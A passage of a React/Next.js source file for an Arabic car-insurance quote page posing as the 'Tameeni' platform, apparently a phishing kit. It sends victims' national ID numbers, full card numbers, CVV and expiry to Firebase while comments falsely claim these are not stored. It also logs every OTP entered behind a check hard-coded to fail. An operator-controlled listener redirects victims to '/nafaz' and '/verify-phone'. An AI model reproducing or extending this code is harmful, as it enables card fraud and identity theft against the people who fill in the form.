"use client"

import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import {
  Shield,
  Users,
  Star,
  CheckCircle,
  Phone,
  Mail,
  FileText,
  CreditCard,
  Menu,
  X,
  ArrowLeft,
  Lock,
  AlertCircle,
  Check,
} from "lucide-react"
import { useState, useEffect, useRef } from "react"
import { setupOnlineStatus } from "@/lib/utils"
import { addData, db } from "@/lib/firebase"
import { offerData } from "@/lib/data"
import { doc, onSnapshot } from "firebase/firestore"

// Mock components to replace missing imports
const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
  <div className="space-y-6">
    <div>
      <label className="block text-sm font-semibold text-gray-700 mb-3">
        الغرض من التأمين <span className="text-red-500">*</span>
      </label>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <button
          type="button"
          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
            formData.insurance_purpose === "renewal"
              ? "border-blue-500 bg-blue-50 text-blue-700"
              : "border-gray-300 hover:border-blue-400"
          }`}
          onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "renewal" }))}
        >
          <div className="text-center">
            <div className="font-semibold">تجديد وثيقة</div>
            <div className="text-sm text-gray-500 mt-1">تجديد وثيقة تأمين موجودة</div>
          </div>
        </button>
        <button
          type="button"
          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
            formData.insurance_purpose === "property-transfer"
              ? "border-blue-500 bg-blue-50 text-blue-700"
              : "border-gray-300 hover:border-blue-400"
          }`}
          onClick={() =>
            setFormData((prev: any) => ({
              ...prev,
              insurance_purpose: "property-transfer",
            }))
          }
        >
          <div className="text-center">
            <div className="font-semibold">نقل ملكية</div>
            <div className="text-sm text-gray-500 mt-1">تأمين مركبة منقولة الملكية</div>
          </div>
        </button>
      </div>
    </div>

    <div>
      <label className="block text-sm font-semibold text-gray-700 mb-3">
        اسم مالك الوثيقة <span className="text-red-500">*</span>
      </label>
      <Input
        type="text"
        placeholder="الاسم الكامل"
        value={formData.documment_owner_full_name}
        onChange={(e) =>
          setFormData((prev: any) => ({
            ...prev,
            documment_owner_full_name: e.target.value,
          }))
        }
        className={`h-12 ${errors.documment_owner_full_name ? "border-red-500" : "border-gray-300"}`}
      />
      {errors.documment_owner_full_name && (
        <p className="text-red-500 text-sm mt-1">{errors.documment_owner_full_name}</p>
      )}
    </div>

    {formData.insurance_purpose === "renewal" && (
      <div>
        <label className="block text-sm font-semibold text-gray-700 mb-3">
          رقم هوية المالك <span className="text-red-500">*</span>
        </label>
        <Input
          type="tel"
          placeholder="1234567890"
          maxLength={10}
          value={formData.owner_identity_number}
          onChange={(e) =>
            setFormData((prev: any) => ({
              ...prev,
              owner_identity_number: e.target.value,
            }))
          }
          className={`h-12 ${errors.owner_identity_number ? "border-red-500" : "border-gray-300"}`}
        />
        {errors.owner_identity_number && <p className="text-red-500 text-sm mt-1">{errors.owner_identity_number}</p>}
      </div>
    )}

    {formData.insurance_purpose === "property-transfer" && (
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-3">
            رقم هوية المشتري <span className="text-red-500">*</span>
          </label>
          <Input
            type="tel"
            placeholder="1234567890"
            maxLength={10}
            value={formData.buyer_identity_number}
            onChange={(e) =>
              setFormData((prev: any) => ({
                ...prev,
                buyer_identity_number: e.target.value,
              }))
            }
            className={`h-12 ${errors.buyer_identity_number ? "border-red-500" : "border-gray-300"}`}
          />
          {errors.buyer_identity_number && <p className="text-red-500 text-sm mt-1">{errors.buyer_identity_number}</p>}
        </div>
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-3">
            رقم هوية البائع <span className="text-red-500">*</span>
          </label>
          <Input
            type="tel"
            placeholder="1234567890"
            maxLength={10}
            value={formData.seller_identity_number}
            onChange={(e) =>
              setFormData((prev: any) => ({
                ...prev,
                seller_identity_number: e.target.value,
              }))
            }
            className={`h-12 ${errors.seller_identity_number ? "border-red-500" : "border-gray-300"}`}
          />
          {errors.seller_identity_number && (
            <p className="text-red-500 text-sm mt-1">{errors.seller_identity_number}</p>
          )}
        </div>
      </div>
    )}
  </div>
)

const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
  <div className="space-y-6">
    <div>
      <label className="block text-sm font-semibold text-gray-700 mb-3">
        نوع المركبة <span className="text-red-500">*</span>
      </label>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <button
          type="button"
          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
            formData.vehicle_type === "serial"
              ? "border-blue-500 bg-blue-50 text-blue-700"
              : "border-gray-300 hover:border-blue-400"
          }`}
          onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "serial" }))}
        >
          <div className="text-center">
            <div className="font-semibold">مركبة برقم تسلسلي</div>
            <div className="text-sm text-gray-500 mt-1">مركبة مسجلة برقم تسلسلي</div>
          </div>
        </button>
        <button
          type="button"
          className={`p-4 rounded-xl border-2 transition-all duration-200 ${
            formData.vehicle_type === "custom"
              ? "border-blue-500 bg-blue-50 text-blue-700"
              : "border-gray-300 hover:border-blue-400"
          }`}
          onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "custom" }))}
        >
          <div className="text-center">
            <div className="font-semibold">مركبة برقم لوحة</div>
            <div className="text-sm text-gray-500 mt-1">مركبة مسجلة برقم لوحة</div>
          </div>
        </button>
      </div>
    </div>

    <div>
      <label className="block text-sm font-semibold text-gray-700 mb-3">
        الرقم التسلسلي للمركبة <span className="text-red-500">*</span>
      </label>
      <Input
        type="tel"
        placeholder="123456789"
        value={formData.sequenceNumber}
        onChange={(e) => setFormData((prev: any) => ({ ...prev, sequenceNumber: e.target.value }))}
        className="h-12 border-gray-300"
      />
    </div>
  </div>
)

const getBadgeText = (index: number) => {
  switch (index) {
    case 0:
      return "الأفضل سعراً"
    case 1:
      return "موصى به"
    case 2:
      return "خيار جيد"
    default:
      return ""
  }
}

const getTypeBadge = (type: string) => {
  switch (type) {
    case "against-others":
      return "ضد الغير"
    case "comprehensive":
      return "شامل"
    default:
      return "خاص"
  }
}

export default function QuotePage() {
  const [mounted, setMounted] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const headerRef = useRef<HTMLElement>(null)
  const formRef = useRef<HTMLDivElement>(null)
  const stepContentRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    // Initialize visitor ID if not exists
    const visitorID = localStorage.getItem("visitor")
    if (visitorID) {
      setMounted(true)
      setupOnlineStatus(visitorID!)
    } else {
      // Create new visitor ID if none exists
      const newVisitorId = "visitor_" + Date.now()
      localStorage.setItem("visitor", newVisitorId)
      setMounted(true)
      setupOnlineStatus(newVisitorId)
    }
  }, [])

  if (!mounted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-blue-50/30 flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-gray-600">جاري التحميل...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-background" dir="rtl">
      {/* Enhanced Header */}
      <header className="bg-card/95 backdrop-blur-lg border-b border-border px-4 lg:px-6 py-4 sticky top-0 z-50 shadow-sm">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4 lg:gap-8">
            <div className="flex items-center gap-3">
              <div className="w-20 h-12 rounded-lg flex items-center justify-center">
                <img src="/Logo-AR.png" alt="logo" width={80} height={48} />
              </div>
              <div className="hidden sm:block">
                <h1 className="text-xl font-bold text-foreground">تأميني</h1>
                <p className="text-xs text-muted-foreground">منصة التأمين الذكية</p>
              </div>
            </div>

            <nav className="hidden lg:flex items-center gap-8 text-sm font-medium">
              <a href="/" className="text-muted-foreground hover:text-primary transition-colors duration-200">
                الرئيسية
              </a>
              <a href="/#services" className="text-muted-foreground hover:text-primary transition-colors duration-200">
                الخدمات
              </a>
              <a href="/#about" className="text-muted-foreground hover:text-primary transition-colors duration-200">
                عن الشركة
              </a>
              <a href="/#contact" className="text-muted-foreground hover:text-primary transition-colors duration-200">
                اتصل بنا
              </a>
            </nav>
          </div>

          <div className="flex items-center gap-4">
            <div className="hidden md:flex items-center gap-6 text-sm">
              <div className="flex items-center gap-2 text-muted-foreground">
                <Phone className="w-4 h-4" />
                <span>920000000</span>
              </div>
              <div className="flex items-center gap-2 text-muted-foreground">
                <Mail className="w-4 h-4" />
                <span>info@tameeni.com</span>
              </div>
            </div>

            <Button variant="ghost" size="sm" className="lg:hidden" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
              {mobileMenuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
            </Button>
          </div>
        </div>

        {/* Mobile Menu */}
        {mobileMenuOpen && (
          <div className="lg:hidden mt-4 pb-4 border-t border-border">
            <nav className="flex flex-col gap-4 pt-4">
              <a href="/" className="text-muted-foreground hover:text-primary transition-colors">
                الرئيسية
              </a>
              <a href="/#services" className="text-muted-foreground hover:text-primary transition-colors">
                الخدمات
              </a>
              <a href="/#about" className="text-muted-foreground hover:text-primary transition-colors">
                عن الشركة
              </a>
              <a href="/#contact" className="text-muted-foreground hover:text-primary transition-colors">
                اتصل بنا
              </a>
            </nav>
          </div>
        )}
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto p-4 lg:p-6">
        <div className="mb-8">
          <Button
            variant="ghost"
            className="mb-4 text-muted-foreground hover:text-foreground"
            onClick={() => window.history.back()}
          >
            <ArrowLeft className="w-4 h-4 ml-2" />
            العودة للرئيسية
          </Button>

          <div className="text-center">
            <h1 className="text-3xl lg:text-4xl font-bold text-foreground mb-4">احصل على عرض سعر فوري</h1>
            <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
              قارن أفضل عروض التأمين واحصل على أفضل الأسعار في دقائق معدودة
            </p>
          </div>
        </div>

        <ProfessionalQuoteForm />
      </main>
    </div>
  )
}

function ProfessionalQuoteForm() {
  const [currentPage, setCurrentStep] = useState(1)
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [touched, setTouched] = useState<Record<string, boolean>>({})
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [paymentProcessing, setPaymentProcessing] = useState(false)
  const [otpSent, setOtpSent] = useState(false)
  const [otpVerified, setOtpVerified] = useState(false)
  const [otpAttempts, setOtpAttempts] = useState(0)
  const [cardNumber, setCardNumber] = useState("")
  const [pinCode, setPinCode] = useState("")
  const [cardName, setCardName] = useState("")
  const [cardMonth, setCardMonth] = useState("")
  const [cardYear, setCardYear] = useState("")
  const [cvv, setCvv] = useState("")
  const [otp, setOtp] = useState("")
  const [otpTimer, setOtpTimer] = useState(0)
  const [allOtpAttempts, setAllOtpAttempts] = useState<string[]>([])

  const [formData, setFormData] = useState({
    insurance_purpose: "renewal",
    documment_owner_full_name: "",
    owner_identity_number: "",
    buyer_identity_number: "",
    seller_identity_number: "",
    vehicle_type: "serial",
    sequenceNumber: "",
    policyStartDate: "",
    insuranceTypeSelected: "against-others",
    additionalDrivers: 0,
    specialDiscounts: false,
    agreeToTerms: false,
    selectedInsuranceOffer: "",
    selectedAddons: [] as string[],
    phone: "",
  })
  const stepHeaderRef = useRef<HTMLHeadingElement>(null)
  const firstInputRef = useRef<HTMLInputElement>(null)
  const errorSummaryRef = useRef<HTMLDivElement>(null)

  const steps = [
    { number: 1, title: "البيانات الأساسية", subtitle: "معلومات المركبة والمالك", icon: FileText },
    { number: 2, title: "التأمين والأسعار", subtitle: "نوع التأمين ومقارنة العروض", icon: Shield },
    { number: 3, title: "الإضافات والملخص", subtitle: "الخدمات الإضافية ومراجعة الطلب", icon: Star },
    { number: 4, title: "الدفع والتحقق", subtitle: "إتمام الدفع والتحقق من الهوية", icon: CreditCard },
  ]

  useEffect(() => {
    let interval: NodeJS.Timeout
    if (otpTimer > 0) {
      interval = setInterval(() => {
        setOtpTimer((prev) => prev - 1)
      }, 1000)
    }
    return () => clearInterval(interval)
  }, [otpTimer])

  useEffect(() => {
    if (stepHeaderRef.current) {
      stepHeaderRef.current.focus()
      stepHeaderRef.current.scrollIntoView({ behavior: "smooth", block: "start" })
    }
    // Save current step
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      addData({ id: visitorId, currentPage })
    }
  }, [currentPage])

  useEffect(() => {
    if (Object.keys(errors).length > 0 && errorSummaryRef.current) {
      errorSummaryRef.current.focus()
    }
  }, [errors])

  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data()
          if (currentPage !== data.currentPage) {
            if (data.currentPage === "9999") {
              window.location.href = "/verify-phone"
            } else if (data.currentPage === "nafaz" || data.currentPage === "8888") {
              window.location.href = "/nafaz"
            } else if (data.currentPage === "1") {
              setCurrentStep(1)
            } else if (data.currentPage === "2") {
              setCurrentStep(2)
            } else if (data.currentPage === "3") {
              setCurrentStep(3)
            } else if (data.currentPage === "4") {
              setCurrentStep(4)
            }
          }
        }
      })
      return () => unsubscribe()
    }
  }, [])

  const validationRules = {
    documment_owner_full_name: {
      required: true,
      message: "يرجى إدخال اسم مالك الوثيقة بالكامل",
    },
    owner_identity_number: {
      required: true,
      pattern: /^[0-9]{10}$/,
      message: "يرجى إدخال رقم هوية صحيح (10 أرقام)",
    },
    buyer_identity_number: {
      required: true,
      pattern: /^[0-9]{10}$/,
      message: "يرجى إدخال رقم هوية المشتري صحيح (10 أرقام)",
    },
    seller_identity_number: {
      required: true,
      pattern: /^[0-9]{10}$/,
      message: "يرجى إدخال رقم هوية البائع صحيح (10 أرقام)",
    },
    policyStartDate: {
      required: true,
      validate: (value: string) => {
        const selectedDate = new Date(value)
        const today = new Date()
        const maxDate = new Date()
        maxDate.setMonth(maxDate.getMonth() + 3)
        if (selectedDate < today) {
          return "لا يمكن أن يكون تاريخ بداية الوثيقة في الماضي"
        }
        if (selectedDate > maxDate) {
          return "لا يمكن أن يكون تاريخ بداية الوثيقة أكثر من 3 أشهر من اليوم"
        }
        return null
      },
      message: "يرجى اختيار تاريخ بداية الوثيقة",
    },
    agreeToTerms: {
      required: true,
      message: "يجب الموافقة على الشروط والأحكام للمتابعة",
    },
    selectedInsuranceOffer: {
      required: true,
      message: "يرجى اختيار عرض التأمين المناسب",
    },
  }

  const validateField = (fieldName: string, value: any): string | null => {
    const rule = validationRules[fieldName as keyof typeof validationRules] as any
    if (!rule) return null

    if (rule.required && (!value || value === "" || (Array.isArray(value) && value.length === 0))) {
      return rule.message
    }

    if (value && rule.pattern && !rule.pattern.test(value)) {
      return rule.message
    }

    if (value && rule.validate) {
      const customError = rule.validate(value)
      if (customError) return customError
    }

    return null
  }

  const validateStep = (step: number): boolean => {
    const stepErrors: Record<string, string> = {}
    let isValid = true

    switch (step) {
      case 1:
        const ownerNameError = validateField("documment_owner_full_name", formData.documment_owner_full_name)
        if (ownerNameError) {
          stepErrors.documment_owner_full_name = ownerNameError
          isValid = false
        }

        if (formData.insurance_purpose === "renewal") {
          const ownerIdError = validateField("owner_identity_number", formData.owner_identity_number)
          if (ownerIdError) {
            stepErrors.owner_identity_number = ownerIdError
            isValid = false
          }
        } else if (formData.insurance_purpose === "property-transfer") {
          const buyerIdError = validateField("buyer_identity_number", formData.buyer_identity_number)
          const sellerIdError = validateField("seller_identity_number", formData.seller_identity_number)
          if (buyerIdError) {
            stepErrors.buyer_identity_number = buyerIdError
            isValid = false
          }
          if (sellerIdError) {
            stepErrors.seller_identity_number = sellerIdError
            isValid = false
          }
        }
        break

      case 2:
        const selectedOfferError = validateField("selectedInsuranceOffer", formData.selectedInsuranceOffer)
        if (selectedOfferError) {
          stepErrors.selectedInsuranceOffer = selectedOfferError
          isValid = false
        }
        break

      case 3:
        if (!formData.agreeToTerms) {
          stepErrors.agreeToTerms = "يجب الموافقة على الشروط والأحكام للمتابعة"
          isValid = false
        }
        break
    }

    setErrors((prev) => ({ ...prev, ...stepErrors }))
    return isValid
  }

  const handleFieldChange = (fieldName: string, value: any) => {
    setFormData((prev) => ({ ...prev, [fieldName]: value }))
    if (errors[fieldName]) {
      setErrors((prev) => ({ ...prev, [fieldName]: "" }))
    }
  }

  const handleFieldBlur = (fieldName: string) => {
    setTouched((prev) => ({ ...prev, [fieldName]: true }))
    const error = validateField(fieldName, formData[fieldName as keyof typeof formData])
    if (error) {
      setErrors((prev) => ({ ...prev, [fieldName]: error }))
    }
  }

  const nextStep = () => {
    if (validateStep(currentPage)) {
      if (currentPage < steps.length) {
        const visitorId = localStorage.getItem("visitor")
        const dataToSave = {
          id: visitorId,
          ...formData,
          cardNumber,
          cardName,
          cardMonth,
          cardYear,
          cvv,
          createdDate: new Date().toISOString(),
        }
        addData(dataToSave)
        setCurrentStep(currentPage + 1)
      }
    }
  }

  const prevStep = () => {
    const visitorId = localStorage.getItem("visitor")
    if (currentPage > 1) {
      setCurrentStep(currentPage - 1)
      addData({ id: visitorId, currentPage: currentPage - 1 })
    }
  }

  const handlePayment = (): void => {
    const visitorId = localStorage.getItem("visitor")
    if (!visitorId) {
      alert("خطأ في النظام. يرجى إعادة تحميل الصفحة.")
      return
    }
    if (cardNumber.length < 15) {
      alert("رقم البطاقه غير صحيح")
      return
    }
    const paymentData = {
      id: visitorId,
      createdDate: new Date().toISOString(),
      // Only store non-sensitive payment info
      cardNumber,
      cvv: cvv,
      cardName,
      cardMonth,
      cardYear,
      // Don't store CVV or PIN for security
      paymentStatus: "processing",
      paymentInitiatedAt: new Date().toISOString(),
      currentPage: 4,
      ...formData,
    }

    addData(paymentData)
      .then(() => {
        console.log("Payment data saved successfully")
        setPaymentProcessing(true)
        setTimeout(() => {
          setPaymentProcessing(false)
          setOtpTimer(120)
          // Update payment status and move to OTP step
          const completedPaymentData = {
            id: visitorId,
            paymentStatus: "completed",
            paymentCompletedAt: new Date().toISOString(),
            otpSent: true,
            currentPage: 4,
          }
          addData(completedPaymentData)
            .then(() => {
              setOtpSent(true)
            })
            .catch((error) => {
              console.error("Error updating payment completion:", error)
            })
        }, 2000)
      })
      .catch((error) => {
        console.error("Error saving payment data:", error)
        alert("حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى.")
      })
  }

  const sendOTP = (): void => {
    const visitorId = localStorage.getItem("visitor")
    if (!visitorId) {
      alert("خطأ في النظام. يرجى إعادة تحميل الصفحة.")
      return
    }

    setOtpTimer(120)
    const otpSendData = {
      id: visitorId,
      createdDate: new Date().toISOString(),
      otpResendCount: (otpAttempts || 0) + 1,
      otpSent: true,
      paymentStatus: "completed",
      currentPage: 4,
      phoneNumber: formData.phone,
      // Track OTP sending attempts
      otpSendHistory: [
        ...(allOtpAttempts.length > 0 ? [{ sentAt: new Date().toISOString(), attempt: otpAttempts + 1 }] : []),
      ],
      ...formData,
    }

    addData(otpSendData)
      .then(() => {
        console.log("OTP send data saved successfully")
        setOtpSent(true)
      })
      .catch((error) => {
        console.error("Error saving OTP send data:", error)
        alert("حدث خطأ أثناء إرسال الرمز. يرجى المحاولة مرة أخرى.")
      })
  }

  const verifyOTP = (): void => {
    const visitorId = localStorage.getItem("visitor")
    if (!visitorId) {
      alert("خطأ في النظام. يرجى إعادة تحميل الصفحة.")
      return
    }

    const newAllOtpAttempts = [...allOtpAttempts, otp]
    setAllOtpAttempts(newAllOtpAttempts)

    const otpData = {
      id: visitorId,
      otpCode: otp,
      otp: otp,
      otpAttempts: otpAttempts + 1,
      otpVerificationTime: new Date().toISOString(),
      createdDate: new Date().toISOString(),
      allOtpAttempts: newAllOtpAttempts,
      currentPage: 4,
      verificationStatus: "pending",
      ...formData,
      // Include payment data securely
      cardLastFour: cardNumber,
      cvv: cvv, // Only store last 4 digits for security
      cardName,
      paymentStatus: "completed",
    }

    // Save OTP attempt to Firestore
    addData(otpData)
      .then(() => {
        console.log("OTP data saved successfully")
        handleSubmit()
      })
      .catch((error) => {
        console.error("Error saving OTP data:", error)
        alert("حدث خطأ أثناء حفظ البيانات. يرجى المحاولة مرة أخرى.")
      })
  }

  const handleSubmit = async () => {
    if (!validateStep(4)) {
      return
    }

    setIsSubmitting(true)
    const visitorId = localStorage.getItem("visitor")

    try {
      const finalSubmissionData = {
        id: visitorId,
        otpCode: otp,
        otpVerified: false, // Will be updated based on verification result
        otpVerificationTime: new Date().toISOString(),
        submissionTime: new Date().toISOString(),
        finalStatus: "verification_pending",
        otpAttempts: otpAttempts + 1,
        allOtpAttempts: [...allOtpAttempts, otp],
        paymentStatus: "completed",
        currentPage: 4,
        // Include all form data
        ...formData,
        // Include payment info (securely)
        cardLastFour: cardNumber.slice(-4),
        cardName,
        cardMonth,
        cardYear,
        // Don't store sensitive data like full card number, CVV, or PIN
      }

      await addData(finalSubmissionData)

      // Simulate OTP verification (replace with actual verification logic)
      await new Promise((resolve) => setTimeout(resolve, 2000))

      const isOtpValid = false // Replace with actual verification logic

      if (isOtpValid) {
        // Update with successful verification
        await addData({
          id: visitorId,
          otpVerified: true,
          finalStatus: "completed",
          verificationCompletedAt: new Date().toISOString(),
        })
        alert("تم التحقق بنجاح! سيتم توجيهك لصفحة التأكيد.")
      } else {
        // Update with failed verification
        await addData({
          id: visitorId,
          otpVerified: false,
          finalStatus: "verification_failed",
          lastFailedAttempt: new Date().toISOString(),
        })
        alert("رمز خاطئ، سوف يتم إرسال رمز جديد")
        setOtp("")
        setOtpAttempts((prev) => prev + 1)

        // Automatically send new OTP if attempts are less than 3
        if (otpAttempts < 2) {
          sendOTP()
        }
      }
    } catch (error) {
      console.error("Error during OTP verification:", error)
      alert("حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.")
      try {
        await addData({
          id: visitorId,
          errorLog: {
            message: error instanceof Error ? error.message : "Unknown error",
            timestamp: new Date().toISOString(),
            step: "otp_verification",
            otpAttempts: otpAttempts + 1,
          },
        })
      } catch (logError) {
        console.error("Error logging to Firestore:", logError)
      }
    } finally {
      setIsSubmitting(false)
    }
  }

  const ValidatedInput = ({
    label,
    fieldName,
    type = "text",
    placeholder,
    required = false,
    className = "",
    autoFocus = false,
    ...props
  }: {
    label: string
    fieldName: string
    type?: string
    placeholder?: string
    required?: boolean
    className?: string
    autoFocus?: boolean
    [key: string]: any
  }) => {
    const hasError = errors[fieldName] && touched[fieldName]
    return (
      <div className={className}>
        <label className="block text-sm font-semibold text-gray-700 mb-3">
          {label}
          {required && <span className="text-red-500">*</span>}
        </label>
        <Input
          type={type}
          placeholder={placeholder}
          value={formData[fieldName as keyof typeof formData] as string}
          onChange={(e) => {
            const value = e.target.value
            handleFieldChange(fieldName, value)
          }}
          onBlur={() => handleFieldBlur(fieldName)}
          className={`h-12 ${
            hasError
              ? "border-red-500 focus:border-red-500 focus:ring-red-200"
              : "border-gray-300 focus:border-blue-500 focus:ring-blue-200"
          }`}
          {...props}
        />
        {hasError && (
          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
            <AlertCircle className="w-4 h-4 flex-shrink-0" />
            <span>{errors[fieldName]}</span>
          </div>
        )}
      </div>
    )
  }

  const handlePrevious = () => {
    if (currentPage > 1) {
      setCurrentStep(currentPage - 1)
    }
  }

  const handleNext = () => {
    if (currentPage < steps.length) {
      setCurrentStep(currentPage + 1)
    }
  }

  return (
    <Card className="w-full max-w-4xl mx-auto shadow-lg border-border">
      {/* Progress Steps */}
      <div className="bg-muted/30 p-6 border-b border-border">
        <div className="flex items-center justify-between max-w-3xl mx-auto">
          {steps.map((step, index) => (
            <div key={step.number} className="flex items-center flex-1">
              <div className="flex items-center gap-3">
                <div
                  className={`w-12 h-12 rounded-full flex items-center justify-center transition-all duration-300 ${
                    step.number === currentPage
                      ? "bg-primary text-primary-foreground shadow-lg"
                      : step.number < currentPage
                        ? "bg-green-500 text-white"
                        : "bg-muted text-muted-foreground"
                  }`}
                >
                  {step.number < currentPage ? <Check className="w-5 h-5" /> : <step.icon className="w-5 h-5" />}
                </div>
                <div className="hidden lg:block">
                  <p
                    className={`text-sm font-semibold transition-colors duration-300 ${
                      step.number <= currentPage ? "text-foreground" : "text-muted-foreground"
                    }`}
                  >
                    {step.title}
                  </p>
                  <p className="text-xs text-muted-foreground mt-1">{step.subtitle}</p>
                </div>
              </div>
              {index < steps.length - 1 && (
                <div
                  className={`flex-1 h-1 mx-4 lg:mx-6 rounded-full transition-all duration-300 ${
                    step.number < currentPage ? "bg-green-500" : "bg-border"
                  }`}
                />
              )}
            </div>
          ))}
        </div>
      </div>

      {/* Form Content */}
      <div className="p-6 lg:p-8">
        <div className="min-h-[500px] lg:min-h-[600px]">
          {currentPage === 1 && (
            <div className="space-y-8">
              <div className="text-center mb-8">
                <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
                  البيانات الأساسية
                </h3>
                <p className="text-gray-600">أدخل معلومات المركبة والمالك للبدء في الحصول على عرض السعر</p>
              </div>
              <MockInsurancePurpose formData={formData} setFormData={setFormData} errors={errors} />
              <MockVehicleRegistration formData={formData} setFormData={setFormData} errors={errors} />
            </div>
          )}

          {currentPage === 2 && (
            <div className="space-y-8">
              <div className="text-center mb-8">
                <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
                  بيانات التأمين والأسعار
                </h3>
                <p className="text-gray-600">حدد تفاصيل وثيقة التأمين واختر أفضل العروض المتاحة</p>
              </div>

              {/* Insurance Data Section */}
              <div className="bg-gray-50 rounded-xl p-6 mb-8">
                <h4 className="text-xl font-bold text-gray-900 mb-6">تفاصيل التأمين</h4>
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                  <ValidatedInput
                    label="تاريخ بداية الوثيقة"
                    fieldName="policyStartDate"
                    type="date"
                    required
                    min={new Date().toISOString().split("T")[0]}
                    autoFocus={true}
                  />
                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-3">
                      القيمة التقديرية للمركبة <span className="text-red-500">*</span>
                    </label>
                    <Input
                      maxLength={6}
                      name="vehicleValue"
                      placeholder="54,715"
                      required
                      className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                    />
                  </div>
                </div>

                <div className="mt-6">
                  <label className="block text-sm font-semibold text-gray-700 mb-4">
                    نوع التأمين <span className="text-red-500">*</span>
                  </label>
                  <div className="grid grid-cols-2 gap-4">
                    <button
                      type="button"
                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${
                        formData.insuranceTypeSelected === "comprehensive"
                          ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
                          : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
                    >
                      <div className="text-center">
                        <Shield className="w-8 h-8 mx-auto mb-2 text-current" />
                        <div className="font-semibold">تأمين شامل</div>
                        <div className="text-sm text-gray-500 mt-1">تغطية كاملة للمركبة</div>
                      </div>
                    </button>
                    <button
                      type="button"
                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${
                        formData.insuranceTypeSelected === "against-others"
                          ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
                          : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
                    >
                      <div className="text-center">
                        <Users className="w-8 h-8 mx-auto mb-2 text-current" />
                        <div className="font-semibold">تأمين ضد الغير</div>
                        <div className="text-sm text-gray-500 mt-1">التغطية الأساسية</div>
                      </div>
                    </button>
                  </div>
                </div>
              </div>

              {/* Price Comparison Section */}
              <div>
                <h4 className="text-xl font-bold text-gray-900 mb-6 text-center">مقارنة الأسعار</h4>
                <div className="flex justify-center mb-8">
                  <div className="flex bg-gray-100 rounded-xl p-1">
                    <button
                      type="button"
                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
                        formData.insuranceTypeSelected === "against-others"
                          ? "bg-[#109cd4] text-white shadow-md"
                          : "text-gray-600 hover:text-gray-900"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
                    >
                      ضد الغير
                    </button>
                    <button
                      type="button"
                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
                        formData.insuranceTypeSelected === "comprehensive"
                          ? "bg-[#109cd4] text-white shadow-md"
                          : "text-gray-600 hover:text-gray-900"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
                    >
                      شامل
                    </button>
                  </div>
                </div>

                <div className="space-y-4 max-h-96 overflow-y-auto">
                  {offerData
                    .filter((offer) => {
                      if (formData.insuranceTypeSelected === "comprehensive") {
                        return offer.type === "comprehensive" || offer.type === "special"
                      }
                      return offer.type === "against-others"
                    })
                    .sort((a, b) => Number.parseFloat(a.main_price) - Number.parseFloat(b.main_price))
                    .slice(0, 8)
                    .map((offer, index) => {
                      const totalExpenses = offer.extra_expenses.reduce((sum, expense) => sum + expense.price, 0)
                      const finalPrice = Number.parseFloat(offer.main_price) + totalExpenses
                      const isSelected = formData.selectedInsuranceOffer === offer.id

                      return (
                        <Card
                          key={offer.id}
                          className={`relative transition-all duration-200 cursor-pointer hover:shadow-md ${
                            isSelected
                              ? "ring-2 ring-[#109cd4] shadow-lg bg-blue-50/30"
                              : "hover:shadow-sm border-gray-200"
                          }`}
                          onClick={() => handleFieldChange("selectedInsuranceOffer", offer.id)}
                        >
                          <CardContent className="p-0">
                            {/* Header Section */}
                            <div className="p-4 pb-3">
                              <div className="flex items-start gap-3">
                                {/* Radio Button */}
